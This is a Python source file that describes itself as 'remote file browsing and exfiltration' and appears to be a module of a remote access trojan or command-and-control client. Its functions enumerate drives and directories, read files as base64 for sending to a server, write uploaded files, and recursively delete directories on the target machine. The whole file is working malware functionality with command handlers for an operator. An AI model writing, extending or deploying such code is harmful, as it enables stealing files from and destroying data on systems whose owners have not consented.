# core/file_browser.py
import os
import base64
import shutil
from typing import List, Dict, Optional

class FileBrowser:
    """Remote file browsing and exfiltration"""
    
    @staticmethod
    def list_directory(path: str = "C:\\") -> Dict:
        """List directory contents"""
        try:
            if not os.path.exists(path):
                return {"error": f"Path does not exist: {path}"}
            if not os.path.isdir(path):
                return {"error": f"Not a directory: {path}"}
            
            items = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                try:
                    stat_info = os.stat(full_path)
                    items.append({
                        "name": item,
                        "path": full_path,
                        "is_dir": os.path.isdir(full_path),
                        "size": stat_info.st_size if not os.path.isdir(full_path) else 0,
                        "modified": stat_info.st_mtime
                    })
                except:
                    continue
            
            # Sort directories first, then by name
            items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
            return {"success": True, "path": path, "items": items}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def read_file(file_path: str, max_size_mb: int = 10) -> Dict:
        """Read file as base64 (for download)"""
        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            if os.path.isdir(file_path):
                return {"error": f"Is a directory: {file_path}"}
            
            file_size = os.path.getsize(file_path)
            if file_size > max_size_mb * 1024 * 1024:
                return {"error": f"File too large: {file_size} bytes (max {max_size_mb}MB)"}
            
            with open(file_path, "rb") as f:
                content = f.read()
            b64_content = base64.b64encode(content).decode()
            return {
                "success": True,
                "path": file_path,
                "size": file_size,
                "content_b64": b64_content,
                "name": os.path.basename(file_path)
            }
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def delete_file(file_path: str) -> Dict:
        """Delete file or empty directory"""
        try:
            if not os.path.exists(file_path):
                return {"error": f"Path not found: {file_path}"}
            if os.path.isdir(file_path):
                if not os.listdir(file_path):  # empty directory
                    os.rmdir(file_path)
                else:
                    return {"error": "Directory not empty, use delete_tree for recursive deletion"}
            else:
                os.remove(file_path)
            return {"success": True, "deleted": file_path}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def delete_tree(file_path: str) -> Dict:
        """Recursively delete file or directory"""
        try:
            if os.path.isdir(file_path):
                shutil.rmtree(file_path)
            else:
                os.remove(file_path)
            return {"success": True, "deleted": file_path}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def upload_file(remote_path: str, b64_content: str) -> Dict:
        """Upload file to remote system"""
        try:
            content = base64.b64decode(b64_content)
            # Ensure directory exists
            os.makedirs(os.path.dirname(remote_path), exist_ok=True)
            with open(remote_path, "wb") as f:
                f.write(content)
            return {"success": True, "path": remote_path, "size": len(content)}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def drive_list() -> List[str]:
        """Get list of drives on Windows"""
        drives = []
        if os.name == "nt":
            import string
            from ctypes import windll
            drives_bitmask = windll.kernel32.GetLogicalDrives()
            for letter in string.ascii_uppercase:
                if drives_bitmask & 1:
                    drives.append(f"{letter}:\\")
                drives_bitmask >>= 1
        else:
            drives.append("/")
        return drives

# Integration with client commands
class FileBrowserCommands:
    """Command handlers for file browser"""
    @staticmethod
    def handle_ls(path: str) -> str:
        result = FileBrowser.list_directory(path)
        if "error" in result:
            return f"[-] {result['error']}"
        items = result["items"]
        if not items:
            return "[+] Empty directory"
        output = f"Directory: {result['path']}\n"
        for item in items:
            prefix = "[DIR] " if item["is_dir"] else "[FILE]"
            size_str = f" ({item['size']} bytes)" if not item["is_dir"] else ""
            output += f"{prefix} {item['name']}{size_str}\n"
        return output.strip()
    
    @staticmethod
    def handle_download(file_path: str) -> str:
        result = FileBrowser.read_file(file_path, max_size_mb=25)
        if "error" in result:
            return f"[-] {result['error']}"
        # Return base64 content; server can decode
        return f"FILE:{result['name']}:{result['size']}:{result['content_b64']}"
    
    @staticmethod
    def handle_upload(remote_path: str, b64_content: str) -> str:
        result = FileBrowser.upload_file(remote_path, b64_content)
        if "error" in result:
            return f"[-] {result['error']}"
        return f"[+] Uploaded to {remote_path} ({result['size']} bytes)"
    
    @staticmethod
    def handle_delete(file_path: str) -> str:
        result = FileBrowser.delete_tree(file_path)
        if "error" in result:
            return f"[-] {result['error']}"
        return f"[+] Deleted {file_path}"
    
    @staticmethod
    def handle_drives() -> str:
        drives = FileBrowser.drive_list()
        return "Drives: " + ", ".join(drives)
